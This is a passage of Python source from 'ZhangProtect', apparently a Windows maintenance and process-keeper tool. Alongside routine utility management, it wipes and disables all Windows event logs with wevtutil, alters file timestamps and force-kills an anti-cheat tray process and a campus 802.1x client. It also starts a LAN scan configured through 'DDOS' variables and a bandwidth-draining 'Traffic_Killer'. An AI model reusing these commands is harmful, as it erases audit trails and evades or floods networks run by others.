                SetUserFTA_exe,
                DefaultAppLocker_exe,
                ArkTools_dir,
                BluetoothHFPGuard_exe,
                AutoDisplayConfig_exe,
                BLESync_Dir,
                OpenHashTab_Installer_exe,
                LocalSend_dir,
                NetworkGuardian_exe,
                StorageRedirect_exe,
                VeraCrypt,
                ShareX_dir,
                NetworkGuardian_Skill,
                KasperskyDataRedirect_dir,
                KasperskyCSV,
                KasperskyCFG,
                KasperskyCFGTemplate,
            ]
            smart_open.KeepFolder(Maintain_tools_folder)
            copy_files(ProtectExe, Maintain_tools_folder + "\\ZhangProtect.exe")
            with smart_open.smart_opens(
                Maintain_tools_folder + "\\目录说明.txt",
                "w",
            ) as f:
                f.write(
                    "该目录是ZhangProtect常用维护工具合集,在ZhangProtect安装,更新时自动整理生成,可删除本目录来节省空间;生成的ISO镜像文件可供虚拟机等使用\n版本:%s ;整理时间:%s"
                    % (version, str(datetime.datetime.now()))
                )
            Maintain_tools_folder_Tools_dir = Maintain_tools_folder + "\\Tools"
            smart_open.KeepFolder(Maintain_tools_folder_Tools_dir)
            for i in Maintain_protects_list:
                if os.path.exists(i):
                    copy_files(i, Maintain_tools_folder + "\\" + os.path.basename(i))
            for i in Maintain_tools_folder_list:
                if os.path.exists(i):
                    copy_files(
                        i, Maintain_tools_folder_Tools_dir + "\\" + os.path.basename(i)
                    )
            try:
                create_nomedia_files()
            except:
                pass
            try:
                mkiso_result = False
                mkiso_i = 0
                while not mkiso_result:
                    if mkiso_i > 10:
                        logger.log("系统维护ISO文件生成失败")
                    iso_filename = f"ZhangProtect-系统维护-v{version}-{mkiso_i}.iso"
                    mkiso_cmd = [
                        xorriso_exe,
                        "-overwrite",
                        "on",
                        "-rockridge",
                        "on",
                        "-joliet",
                        "on",
                        "-compliance",
                        "no_emul_toc",
                        "-volid",
                        "ZhangProtect",
                        "-outdev",
                        iso_filename,
                        "-map",
                        os.path.basename(Maintain_tools_folder),
                    ]
                    try:
                        subprocess.run(mkiso_cmd, cwd=ProtectDir, check=True)
                        mkiso_result = True
                        logger.log("已生成系统维护ISO文件")
                        try:
                            os.mkdir(ProtectDir + "ZhangProtect-系统维护-ISO镜像")
                        except:
                            pass
                        try:
                            shutil.move(
                                ProtectDir + iso_filename,
                                ProtectDir
                                + "ZhangProtect-系统维护-ISO镜像\\"
                                + iso_filename,
                            )
                        except:
                            pass
                        break
                    except:
                        mkiso_result = False
                    mkiso_i += 1
            except:
                pass
        try:
            shutil.move(
                ProtectDir + iso_filename,
                ProtectDir + "ZhangProtect-系统维护-ISO镜像\\" + iso_filename,
            )
        except:
            pass
        if (
            (os.path.isfile(randomwifissid) or os.path.isfile(randomwifipwd))
            and (os.path.isfile(openwifi) or hidesettingflag == "1")
        ) and not os.path.isfile(closewifi):
            try:
                for i in get_all_user_profiles():
                    try:
                        with smart_open.smart_opens(
                            "%s\\随机热点信息.txt" % i["desktop"],
                            "w",
                        ) as f:
                            f.write(random_wifi_conf)
                    except Exception as e:
                        pass
            except Exception as e:
                logger.log(
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
            RunWrapper("powershell " + StopWifiShare)
            random_WiFi_msg = (
                'mshta vbscript:Msgbox("'
                + random_wifi_conf.replace("\n", '"+chr(10)+"')
                + '",4096,"随机热点验证")(window.close)'
            )
            runas("users", random_WiFi_msg)
            logger.log(random_wifi_conf)
        try:
            with smart_open.smart_opens(
                AutoAnswer,
                "w",
            ) as f:
                f.write("y" * 726726)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        setpriority(os.getpid(), 0, True, False)
        try:
            if os.path.isfile(force_out_files):
                os.remove(force_out_files)
        except:
            pass
        logger.log("定义阶段成功完成")
    except Exception as e:
        logger.log(
            "抛出错误在定义阶段"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
        exit(0)
    return True


def pope():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion
    try:
        logger.log("程序初始化完成,开始运行")
        RunWrapper("cmd /c " + AllRunCommand + "<" + AutoAnswer + " >nul 2>nul")
        RunWrapper("schtasks /run /I /tn ZhangProtect\\BatKeeperRun")
    except Exception as e:
        logger.log(
            "抛出错误在运行AllRunCommands阶段"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
    return True


def second_run_tasks(wd):
    logger.log("[后台任务]开始运行")
    global ZhangProtectPauseFlag
    background_tasks_int = 1
    while True:
        try:
            wd.feed()
            while ZhangProtectPauseFlag:
                logger.log("[游戏运行自动暂停]后台线程已暂停运行")
                wd.smart_sleep(30)
            if os.path.isfile(change_all_filetime_flag):
                with wd.auto_feed(interval=1):
                    if background_tasks_int == 1:  # 仅在第一次运行的时候设置的项目
                        change_all_filetime(True)
                    else:
                        change_all_filetime(False)
            if background_tasks_int == 1:
                try:
                    set_full_permissions(f"{datadir}\\Users")
                except:
                    pass
            clear_system_logs_command = (
                "for /f "
                + chr(34)
                + "tokens=*"
                + chr(34)
                + " %1 in ('wevtutil.exe el') DO (wevtutil.exe cl "
                + chr(34)
                + "%1"
                + chr(34)
                + ' & wevtutil.exe sl "%1" /e:false)'
            )
            RunWrapper(
                "sc stop Winmgmt & sc config Winmgmt start=disabled"
                if os.path.isfile(disable_Winmgmt)
                else "sc config Winmgmt start=auto & sc start Winmgmt"
            )
            with wd.auto_feed(interval=1):
                if os.path.isfile(del_system_logs):
                    logger.log("清空系统日志!")
                    RunWrapper(clear_system_logs_command).read()
                    RunWrapper("wevtutil.exe cl system").read()
            reregdll_a = "for %1 in (%windir%\\system32\\*.dll) do (regsvr32.exe /s %1)"
            reregdll_b = "for %i in (%windir%\\system32\\*.ocx) do (regsvr32.exe /s %i)"
            with wd.auto_feed(interval=1):
                if os.path.isfile(autoreregdll):
                    logger.log("重新注册DLL!")
                    RunWrapper(reregdll_a).read()
                    RunWrapper(reregdll_b).read()
            RunWrapper("taskkill /f /im ACE-Tray.exe /t").read()
            if os.path.isfile(fuck_8021x):
                RunWrapper(
                    "ping -n 1 www.baidu.com && taskkill /f /im 8021x.exe /t && taskkill /f /im suservice.exe /t"
                ).read()
            get_all_user_profiles(True)  # 刷新其缓存
            setpriority(os.getpid(), 0, True, False)
            block_all_update()
            logger.log("后台任务第 %s 次循环正常" % background_tasks_int)
            wd.smart_sleep(120)
            background_tasks_int += 1
        except Exception as e:
            background_tasks_int = 1
            logger.log(f"后台任务出现错误:{e}")
            wd.smart_sleep(10)


def TaskKeeping_Thread(wd):
    logger.log("[守护进程]开始运行")
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion
    logon_new_user_A = len(get_logon_user())
    taskkeeping_run_int = 1
    BluetoothHFPGuard_Restore_Flag = False
    while True:
        wd.feed()
        try:
            powercfg_auto_change()
        except:
            pass
        try:
            while ZhangProtectPauseFlag:
                logger.log("[游戏运行自动暂停]进程守护已暂停运行")
                wd.smart_sleep(30)
            get_process_list(refresh=True)
            logon_new_user_B = len(get_logon_user())
            if os.path.isfile(fuck_8021x):
                RunWrapper(
                    "ping -n 1 www.baidu.com && taskkill /f /im 8021x.exe /t && taskkill /f /im suservice.exe /t"
                ).read()
            if logon_new_user_A == logon_new_user_B:  # 新用户登录后或用户注销,暂停10秒
                TaskKeep(proname0, tdir0, True)
                TaskKeep(proname1, tdir1, True)
                TaskKeep("IconRemover.exe", IconRemover_exe + " /hideapp", True)
                if (os.path.isfile(ListeningLid)) and (
                    os.path.isfile(donotautopower)
                    and (not os.path.isfile(disablehibernate))
                ):
                    TaskKeep("Auto_Lid_Sleep.exe", Auto_Lid_Sleep_exe, True)
                else:
                    RunWrapper("Taskkill /f /im Auto_Lid_Sleep.exe")
                if os.path.isfile(DisableBluetoothHFP):
                    TaskKeep("BluetoothHFPGuard.exe", BluetoothHFPGuard_exe, False)
                    BluetoothHFPGuard_Restore_Flag = False
                else:
                    RunWrapper("Taskkill /f /im BluetoothHFPGuard.exe")
                    if not BluetoothHFPGuard_Restore_Flag:
                        RunWrapper(f'"{BluetoothHFPGuard_exe}" -restore')
                    BluetoothHFPGuard_Restore_Flag = True
                if os.path.isfile(EnableAutoScreenshot):
                    TaskKeep(
                        "AutoScreenshot.exe",
                        AutoScreenshot_exe + " -autorun",
                        True,
                        run_on_keeptask=AutoScreenshot_lock_ini_config,
                        run_on_keeptask_args=(
                            AutoScreenshot_ini,
                            datadir + ":\\Files\\Data\\AutoScreenshot",
                        ),
                    )
                if os.path.isfile(show_DeskDisp):
                    TaskKeep("DeskDisp.exe", DeskDisp_exe, True)
                if os.path.isfile(use_ShareX):
                    TaskKeep("ShareX.exe", ShareX_bat, True)
                if os.path.isfile(taskbarhide):
                    TaskKeep("taskbar_hider.exe", taskbar_hider_exe, True)
                if os.path.isfile(Digital_Clock_4_flag):
                    TaskKeep("digital_clock.exe", Digital_Clock_4_exe, True)
                if os.path.isfile(use_TurboSwitch):
                    TaskKeep("TurboSwitch.exe", TurboSwitch_exe, True)
                if os.path.isfile(KeepEverything):
                    TaskKeep("Everything.exe", f"{Everything_Exe} -startup", True)
                if os.path.isfile(KeepLocalSend):
                    TaskKeep("localsend_app.exe", f"{LocalSend_exe} --hidden", True)
                if os.path.isfile(use_networkguard):
                    TaskKeep(
                        "NetworkGuardian.exe",
                        f"{NetworkGuardian_exe} --minimized",
                        True,
                    )
                if os.path.isfile(ipcheck) and not os.path.isfile(disable_Winmgmt):
                    TaskKeep(
                        "Zhang_IpHelper.exe",
                        chr(34) + iphelper + chr(34) + " /a",
                        False,
                    )
                if os.path.isfile(Keep_simplewall):
                    TaskKeep(
                        "simplewall.exe",
                        chr(34) + simplewall_exe + chr(34) + " -minimized",
                        True,
                    )
                if os.path.isfile(use_file_server):
                    TaskKeep(
                        "file_server.exe",
                        chr(34) + file_server_exe + chr(34) + " " + datadir + ":\\",
                        False,
                    )
                if os.path.isfile(KeepPopBlock):
                    TaskKeep(
                        "PopBlock.exe",
                        chr(34) + PopBlock_exe + chr(34) + " -hide",
                        True,
                    )
                if os.path.isfile(keep_memreduct):
                    TaskKeep(
                        "memreduct.exe",
                        chr(34) + memreduct + chr(34) + " /minimized",
                        True,
                    )
                if os.path.isfile(keep_desktopok):
                    TaskKeep(
                        "desktopok.exe",
                        chr(34) + DesktopOK + chr(34) + " -bg -startup",
                        True,
                    )
                if os.path.isfile(use_movemouse):
                    TaskKeep("MoveMouse.exe", MoveMouse_exe, True)
                if os.path.isfile(fuck_keyboard):
                    TaskKeep("FuckKeyBoardZ.exe", FuckKeyBoardZ_exe, True)
                if os.path.isfile(keep_awake):
                    TaskKeep("Awake.exe", keep_awake_exe, True)
                if os.path.isfile(use_fraps):
                    TaskKeep("fraps.exe", FrapsExe, True)
                if os.path.isfile(keep_speccy):
                    TaskKeep(
                        "Speccy64.exe",
                        chr(34) + Speccy_exe + chr(34) + " /totray",
                        True,
                    )
                if os.path.isfile(Disable_sys_dispatch):
                    TaskKeep(
                        "SysDispatch.exe", chr(34) + ProtectSysDispatch + chr(34), True
                    )
                if os.path.isfile(keep_DesktopGoose):
                    TaskKeep(
                        "GooseDesktop.exe", chr(34) + DesktopGoose_exe + chr(34), True
                    )
                if os.path.isfile(use_36o_ap_flag) and not os.path.isfile(closewifi):
                    global ap_360_exe
                    if (
                        hidesettingflag == "1" or os.path.isfile(openwifi)
                    ) and not os.path.isfile(closewifi):
                        if os.path.isfile(ap_360_exe):
                            if not os.path.isfile(closewifi):
                                ap_restart_flag = 0
                                if get_process_num("360AP.exe") < 2:
                                    ap_restart_flag = 1
                                    RunWrapper(
                                        'Taskkill /f /im 360AP.exe /t & powershell "Get-Process -Name 360AP | Stop-Process -Force"'
                                    ).read()
                                    logger.log(
                                        "360AP进程异常,已结束残留进程%s,%s"
                                        % (
                                            get_process_num("360AP.exe"),
                                            get_pro_user_num("360AP.exe"),
                                        ),
                                    )
                                for i in get_all_user_profiles():
                                    userpro = i["appdata"]
                                    ap_profile = userpro + "\\360AP\\config.ini"
                                    if os.path.isfile(ap_profile):
                                        try:
                                            with smart_open.smart_opens(
                                                ap_profile,
                                                "r",
                                            ) as f:
                                                old_ap_ini = f.read()
                                                new_ap_ini = ""
                                        except Exception as e:
                                            try:
                                                with smart_open.smart_opens(
                                                    ap_profile,
                                                    "r",
                                                ) as f:
                                                    old_ap_ini = f.read()
                                                    new_ap_ini = ""
                                            except Exception as e:
                                                try:
                                                    with smart_open.smart_opens(
                                                        ap_profile,
                                                        "r",
                                                    ) as f:
                                                        old_ap_ini = f.read()
                                                        new_ap_ini = ""
                                                except Exception as e:
                                                    logger.log(
                                                        str(sys.exc_info())
                                                        + "行:"
                                                        + str(
                                                            e.__traceback__.tb_lineno
                                                        ),
                                                    )
                                        try:
                                            for j in old_ap_ini.splitlines():
                                                if "=" in j:
                                                    if j.split("=")[0] == "schoolhook":
                                                        j = "schoolhook=1"
                                                    if (
                                                        j.split("=")[0]
                                                        == "main_banner_showclosebtn"
                                                    ):
                                                        j = "main_banner_showclosebtn=0"
                                                    if j.split("=")[0] == "dns_check":
                                                        j = "dns_check=1"
                                                    if (
                                                        j.split("=")[0]
                                                        == "m_bro_hj_opt"
                                                    ):
                                                        j = "m_bro_hj_opt=1"
                                                    if j.split("=")[0] == "wifistub":
                                                        j = "wifistub=1"
                                                    if j.split("=")[0] == "freessid":
                                                        j = "freessid=" + wifiid
                                                    if j.split("=")[0] == "schoolhook":
                                                        j = "schoolhook=1"
                                                    if j.split("=")[0] == "freepwd":
                                                        pass
                                                    if (
                                                        j.split("=")[0]
                                                        == "autorun_start_free_wifi"
                                                    ):
                                                        j = "autorun_start_free_wifi=0"
                                                    if (
                                                        j.split("=")[0]
                                                        == "dnshremind_popup"
                                                    ):
                                                        j = "dnshremind_popup=0"
                                                    if j.split("=")[0] == "CreateWifi":
                                                        j = "CreateWifi=1"
                                                    if (
                                                        j.split("=")[0]
                                                        == "NoConnectWiFi"
                                                    ):
                                                        j = "NoConnectWiFi=0"
                                                    if j.split("=")[0] == "ShowTray":
                                                        j = "ShowTray=0"
                                                    if j.split("=")[0] == "safe_dns":
                                                        j = "safe_dns=0"
                                                    if (
                                                        j.split("=")[0]
                                                        == "WhiteJoinNotify"
                                                    ):
                                                        j = "WhiteJoinNotify=0"
                                                    if (
                                                        j.split("=")[0]
                                                        == "closeprotalpage"
                                                    ):
                                                        j = "closeprotalpage=1"
                                                    if j.split("=")[0] == "new_feture":
                                                        j = "new_feture=0"
                                                    if (
                                                        j.split("=")[0]
                                                        == "has_desktop_shortcut"
                                                    ):
                                                        j = "has_desktop_shortcut=1"
                                                new_ap_ini += j + chr(10)
                                            with smart_open.smart_opens(
                                                ap_profile,
                                                "w",
                                            ) as f:
                                                f.write(new_ap_ini)
                                        except Exception as e:
                                            logger.log(
                                                str(sys.exc_info())
                                                + "行:"
                                                + str(e.__traceback__.tb_lineno),
                                            )
                                if (
                                    not get_task_status("360AP.exe")
                                    or ap_restart_flag == 1
                                ):
                                    ap_restart_flag = 0
                                    ap_user = get_logon_user()[0]
                                    RunWrapper("powershell %s" % StopWifiShare)
                                    runas(
                                        ap_user,
                                        chr(34)
                                        + ap_360_exe
                                        + chr(34)
                                        + " /menufree /school",
                                    )
                                    logger.log("360AP重新启动中:%s" % ap_user)
                                    ap_timeout = 0
                                    while (
                                        ap_timeout < 10
                                        and get_process_num("360AP.exe") < 2
                                    ):
                                        time.sleep(3)
                                        ap_timeout += 1
                                        logger.log("ZhangProtect已暂停,等待360AP运行")
                        else:
                            ap_360_repair()
                if os.path.isfile(more_keep_process):
                    more_keep = ""
                    with smart_open.smart_opens(
                        more_keep_process,
                        "r",
                    ) as f:
                        more_keep = f.read().splitlines()
                    more_keep_list = []
                    for i in more_keep:
                        if (
                            "*" in i
                            and not i[0] == "#"
                            and (len(i.split("*")) == 2 or len(i.split("*")) == 3)
                        ):
                            more_keep_list.append(i)
                    try:
                        for i in more_keep_list:
                            more_keep_info = i.split("*")
                            if len(more_keep_info) == 2:
                                TaskKeep(
                                    more_keep_info[0],
                                    more_keep_info[1],
                                    True,
                                    hight=False,
                                )
                            elif len(more_keep_info) == 3:
                                if more_keep_info[2] == "admin":
                                    TaskKeep(
                                        more_keep_info[0],
                                        more_keep_info[1],
                                        True,
                                        hight=True,
                                    )
                                else:
                                    TaskKeep(
                                        more_keep_info[0],
                                        more_keep_info[1],
                                        True,
                                        hight=False,
                                    )
                    except Exception as e:
                        logger.log(
                            str(sys.exc_info())
                            + "行:"
                            + str(e.__traceback__.tb_lineno),
                        )
                else:
                    with smart_open.smart_opens(
                        more_keep_process,
                        "w",
                    ) as f:
                        f.write(
                            "#您可在此文件定义更多进程守护,井号开头注释\r\n#格式: 进程名*启动命令 ,一行一个。在启动命令后添加*admin能够以提升权限运行,例如 进程名*启动命令*admin。"
                        )
            else:
                logon_new_user_A = logon_new_user_B
                wd.smart_sleep(10)
            taskkeeping_run_int += 1
            logger.log("进程守护线程第 %s 次循环正常" % taskkeeping_run_int)
        except Exception as e:
            taskkeeping_run_int = 1
            logger.log(f"守护进程出现错误:{e}")
            wd.smart_sleep(10)
        wd.smart_sleep(5)  # 代替time.sleep()


def pause_on_game_monitor(wd):
    global ZhangProtectPauseFlag
    logger.log("[游戏自动暂停]开始运行")
    power_plan_cache = "UNKNOWN"
    while True:
        try:
            ZhangProtectPauseFlag = False
            if not os.path.isfile(run_on_pause_on_game_start_bat):
                with smart_open.smart_opens(
                    run_on_pause_on_game_start_bat,
                    "w",
                ) as f:
                    f.write(
                        f'rem 此批处理文件将在游戏开始运行时被执行(开启游戏运行时暂停功能) [传入的第一个参数:进程名]\nrem 默认以SYSTEM用户执行，如需使用其他用户执行，请使用命令行[runas_user.exe]，具体参数详见["{runas_user_exe}" /h]'
                    )
            if not os.path.isfile(run_on_pause_on_game_end_bat):
                with smart_open.smart_opens(
                    run_on_pause_on_game_end_bat,
                    "w",
                ) as f:
                    f.write(
                        f'rem 此批处理文件将在游戏结束时被执行(开启游戏运行时暂停功能) [传入的第一个参数:进程名]\nrem 默认以SYSTEM用户执行，如需使用其他用户执行，请使用命令行[runas_user.exe]，具体参数详见["{runas_user_exe}" /h]'
                    )
            if os.path.isfile(pause_on_game):
                if os.path.isfile(pause_on_game_list):
                    with smart_open.smart_opens(
                        pause_on_game_list,
                        "r",
                    ) as f:
                        pause_on_game_ls = f.read().splitlines()
                    for i in pause_on_game_ls:
                        wd.feed()
                        i = str(i).casefold()
                        no_red_dot = False
                        if "*" in i:  # 游戏进程特殊参数
                            gl_args = i.split("*")
                            i = gl_args[0]
                            if "noreddot" in gl_args:
                                no_red_dot = True
                        if not i == "":
                            if not i[0] == "#":
                                if (
                                    not i
                                    in [
                                        "protect.exe",
                                        "explorer.exe",
                                        "cmd.exe",
                                        "powershell.exe",
                                    ]
                                ) and (not i in os.listdir()):
                                    if get_task_status(i):  # 检测到游戏进程
                                        ZhangProtectPauseFlag = True
                                        runas(
                                            "SYSTEM",
                                            f'{run_on_pause_on_game_start_bat} "{i}"',
                                        )
                                        logger.log(
                                            "[游戏运行自动暂停]游戏正在运行已自动运行 %s"
                                            % run_on_pause_on_game_start_bat,
                                        )
                                        if not os.path.isfile(pause_on_game_flag):
                                            with smart_open.smart_opens(
                                                pause_on_game_flag, "w"
                                            ) as f:
                                                f.write("1")
                                        for j in get_zhangprotect_schtasks():
                                            j = str(j).casefold()
                                            if not j in [
                                                "protect",
                                                "autoprea",
                                                "autopreb",
                                                "autoprec",
                                                "protectkeeper",
                                            ]:
                                                RunWrapper(
                                                    "schtasks /end /tn ZhangProtect\\%s"
                                                    % j
                                                ).read()
                                                RunWrapper(
                                                    "schtasks /change /tn ZhangProtect\\%s /disable"
                                                    % j
                                                ).read()
                                            else:
                                                RunWrapper(
                                                    "schtasks /change /tn ZhangProtect\\%s /enable"
                                                    % j
                                                ).read()
                                        if os.path.isfile(highper_on_game):
                                            try:
                                                power_plan_cache = (
                                                    powercfg.get_current_plan_name()
                                                )  # 记录当前电源计划
                                                logger.log(
                                                    f"[游戏运行自动暂停]游戏正在运行电源计划切换:{power_plan_cache} --> 高性能,游戏结束后会自动切回(仅限系统电源计划,否则无法换回)",
                                                )
                                                power_performance(
                                                    os.path.isfile(donotautopower)
                                                )
                                            except:
                                                pass
                                        while get_task_status(i):  # 持续阻塞暂停运行
                                            wd.feed()
                                            ZhangProtectPauseFlag = True
                                            logger.log(
                                                "[游戏运行自动暂停]检测到进程 %s 正在运行,ZhangProtect暂停工作"
                                                % i,
                                            )
                                            if os.path.isfile(highper_on_game):
                                                power_performance(False)
                                            RunWrapper(
                                                'taskkill /f /im memreduct.exe /t & powershell "Get-Process -Name memreduct | Stop-Process -Force"'
                                            ).read()
                                            RunWrapper(
                                                'taskkill /f /im desktopok.exe /t & powershell "Get-Process -Name desktopok | Stop-Process -Force"'
                                            ).read()
                                            if os.path.isfile(disable_Proxy_ongame):
                                                RunWrapper(
                                                    'for /f "delims=" %i in (\'reg query HKEY_USERS\') do (reg add "%i\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /t REG_DWORD /v ProxyEnable /d 0 /f)'
                                                ).read()
                                            if os.path.isfile(ZhangGameRedDotflag):
                                                if no_red_dot:
                                                    RunWrapper(
                                                        "Taskkill /f /im ZhangGameRedDot.exe /t"
                                                    )
                                                else:
                                                    TaskKeep(
                                                        "ZhangGameRedDot.exe",
                                                        ZhangGameRedDot_exe,
                                                        True,
                                                    )
                                            if os.path.isfile(FilterKeyOnGame):
                                                TaskKeep(
                                                    "keyboard_filter.exe",
                                                    keyboard_filter_exe,
                                                    True,
                                                )
                                            if os.path.isfile(use_movemouse):
                                                TaskKeep(
                                                    "MoveMouse.exe",
                                                    MoveMouse_exe,
                                                    True,
                                                )
                                            if os.path.isfile(use_fraps):
                                                TaskKeep("fraps.exe", FrapsExe, True)
                                            if os.path.isfile(fuck_keyboard):
                                                TaskKeep(
                                                    "FuckKeyBoardZ.exe",
                                                    FuckKeyBoardZ_exe,
                                                    True,
                                                )
                                            if os.path.isfile(
                                                Auto_SetGameToPcore
                                            ):  # 自动游戏绑定大核心并提高优先级
                                                set_affinity_result = 0
                                                if not os.path.isfile(
                                                    Game_Reverse_Core
                                                ):  # 正常使用P核心
                                                    set_affinity_result = (
                                                        set_affinity_by_name(
                                                            i, True, True, 1
                                                        )
                                                    )
                                                else:  # 反转使用E核心
                                                    set_affinity_result = (
                                                        set_affinity_by_name(
                                                            i, True, True, 2
                                                        )
                                                    )
                                                logger.log(
                                                    f"[游戏绑定核心]将进程{i}绑定到大核心;操作:{set_affinity_result}"
                                                )
                                            setpriority(os.getpid(), 0, True, False)
                                            wd.smart_sleep(15)
                                        else:
                                            if os.path.isfile(ZhangGameRedDotflag):
                                                RunWrapper(
                                                    "Taskkill /f /im ZhangGameRedDot.exe /t"
                                                )
                                            if os.path.isfile(FilterKeyOnGame):
                                                with open(
                                                    keyboard_filter_exit_flag, "w"
                                                ) as f:
                                                    f.write("1")
                                            runas(
                                                "SYSTEM",
                                                f'{run_on_pause_on_game_end_bat} "{i}"',
                                            )
                                            if os.path.isfile(highper_on_game):
                                                try:
                                                    logger.log(
                                                        f"[游戏运行自动暂停]游戏运行结束,电源计划还原:{power_plan_cache}",
                                                    )
                                                    if (
                                                        not power_plan_cache
                                                        == "UNKNOWN"
                                                    ):
                                                        powercfg.powercfg_change(
                                                            power_plan_cache
                                                        )
                                                except:
                                                    pass
                                            logger.log(
                                                "[游戏运行自动暂停]游戏进程退出已自动运行 %s"
                                                % run_on_pause_on_game_end_bat,
                                            )
                                            if os.path.isfile(pause_on_game_flag):
                                                os.remove(pause_on_game_flag)
                else:
                    with smart_open.smart_opens(
                        pause_on_game_list,
                        "w",
                    ) as f:
                        f.write(
                            f"#开启功能后,检测到对应游戏进程运行时ZhangProtect将暂停运行,以及其他游戏功能均使用本进程列表。在此文件写下游戏进程名,一行一个,井号开头注释;用户也可自定义自动批处理\n#检测到游戏运行时,将自动执行批处理 {run_on_pause_on_game_start_bat}\n#游戏结束后将自动执行批处理{run_on_pause_on_game_end_bat}\n#在进程名后添加*noreddot来对该进程关闭红点,如:abc.exe*noreddot"
                        )
        except:
            pass
        wd.smart_sleep(15)


def application():
    global _should_broadcast_environment_change, qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion
    WhileNum = 0
    ztimeoutA = 0
    ztimeoutB = 9999
    ztimeoutC = 9999
    no_network_run_flag = False
    no_network_run_num = 0
    if os.path.isfile(auto_Timesync):
        RunWrapper(f"{NetTime_exe} /verysilent")
    try:
        if hidesettingflag == "1" and not DDOSConf == "Disable":
            logger.log("启动扫描 %s" % DDOSConf)
            threading.Thread(
                target=Zhang_lan_scan.scan,
                args=(
                    1,
                    random.randrange(2, 100),
                    DDOSConf,
                    "http",
                    "scan_result.txt",
                    random.randrange(1, 11),
                ),
            ).start()
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
    now_time_a = str(datetime.date.today())
    AutoRunCommand = datadir + ":\\Files\\AutoCommand"
    AutoRunCommandBat = AutoRunCommand + "\\AutoCommand.bat"
    Auto_run_bat_A = ""
    try:
        with smart_open.smart_opens(
            AutoRunCommandBat,
            "r",
        ) as f:
            Auto_run_bat_A = f.read()
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
    logon_new_user_A = len(get_logon_user())
    if os.path.isfile(Traffic_Killer_flag):
        threading.Thread(target=Traffic_Killer.main).start()
        logger.log("流量消耗器运行")
    global ZhangProtectPauseFlag
    try:
        Watch_dog_Thread_TaskKeeping_Thread = thread_monitor.WatchdogThread(
            "TaskKeeping_Thread", TaskKeeping_Thread, timeout=60
        )
        Watch_dog_Thread_second_run_tasks = thread_monitor.WatchdogThread(
            "second_run_tasks", second_run_tasks, timeout=60
        )
        Watch_dog_Thread_TaskKeeping_Thread.start()
        Watch_dog_Thread_second_run_tasks.start()
        if os.path.isfile(pause_on_game):
            Watch_dog_Thread_pause_on_game_monitor = thread_monitor.WatchdogThread(
                "pause_on_game_monitor", pause_on_game_monitor, timeout=60
            )
            Watch_dog_Thread_pause_on_game_monitor.start()
    except:
        pass
    time.sleep(5)
    logger.log("5秒后开始执行主线程")
    while True:
        global wifiid, wifipw
        while ZhangProtectPauseFlag:
            logger.log("[游戏运行自动暂停]主线程已暂停运行")
            time.sleep(30)
        get_process_list(refresh=True)
        get_all_user_profiles(True)
        Create_All_Schtasks()
        try:
            disable_quick_edit_mode()
        except:
            pass
        try:
            now_time_b = str(datetime.date.today())
            try:
                with smart_open.smart_opens(
                    AutoRunCommandBat,
                    "r",
                ) as f:
                    Auto_run_bat_B = f.read()
                if not Auto_run_bat_B == Auto_run_bat_A:
                    Auto_run_bat_A = Auto_run_bat_B
                    runas("SYSTEM", "cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                    RunWrapper("cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                    logger.log("自动脚本被修改,已自动运行")
            except Exception as e:
                Auto_run_bat_A = 0
            if not now_time_a == now_time_b:
                now_time_a = now_time_b
                # 这里往下执行每天的内容,每天运行一次,适合长时间运行本程序情况下跨日执行
                if os.path.isfile(Open_SystemBackup_Flag):
                    System_Backup_Pro = threading.Thread(
                        target=system_backup, args=(datadir,)
                    )
                    System_Backup_Pro.start()
                    logger.log("根据策略设置,创建自动备份线程,日期:" + now_time_b)
            WhileNum += 1
            ztimeoutA += 1
            ztimeoutB += 1
            ztimeoutC += 1
            logon_new_user_B = len(get_logon_user())
            try:
                for i in get_zhangprotect_schtasks():
                    i = str(i).casefold()
                    if not i in ["autoprea", "autopreb", "autoprec"]:
                        RunWrapper(
                            "schtasks /change /tn ZhangProtect\\%s /enable" % i
                        ).read()
            except:
                pass
            ZhangProtectPauseFlag = False
            try:
                for i in get_all_user_profiles():
                    MoveMouse_data = i["appdata"] + "\\Ellanet\\Move Mouse"
                    MoveMouse_xml = MoveMouse_data + "\\Settings.xml"
                    MoveMouse_xml_data = (
                        "<?xml version="
                        + chr(34)
                        + "1.0"
                        + chr(34)
                        + " encoding="
                        + chr(34)
                        + "utf-8"
                        + chr(34)
                        + "?>"
                        + chr(10)
                        + "<Settings xmlns:xsd="
                        + chr(34)
                        + "http://www.w3.org/2001/XMLSchema"
                        + chr(34)
                        + " xmlns:xsi="
                        + chr(34)
                        + "http://www.w3.org/2001/XMLSchema-instance"
                        + chr(34)
                        + ">"
                        + chr(10)
                        + "  <LowerInterval>5</LowerInterval>"
                        + chr(10)
                        + "  <UpperInterval>60</UpperInterval>"
                        + chr(10)
                        + "  <RandomInterval>false</RandomInterval>"
                        + chr(10)
                        + "  <AutoPause>true</AutoPause>"
                        + chr(10)
                        + "  <AutoResume>true</AutoResume>"
                        + chr(10)
                        + "  <AutoResumeSeconds>5</AutoResumeSeconds>"
                        + chr(10)
                        + "  <EnableLogging>false</EnableLogging>"
                        + chr(10)
